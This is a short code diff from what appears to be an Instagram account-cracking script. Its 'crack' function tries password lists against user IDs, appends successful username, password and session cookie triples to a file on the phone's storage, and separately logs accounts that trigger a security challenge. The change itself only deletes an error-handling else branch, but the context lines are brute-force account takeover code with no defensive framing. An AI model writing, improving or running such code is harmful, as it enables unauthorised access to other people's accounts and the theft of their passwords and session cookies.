@@ -252,9 +252,6 @@ def crack(uid, password_list, total_count):
                           open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
                           Ok.append(username)
                           return True
-                else:
-                  #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
-                   continue
             elif 'challenge_required' in response.text:
                    #print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                    open("/sdcard/SUMON_INS_CH.txt","a").write(uid+"|"+pw+"\n")
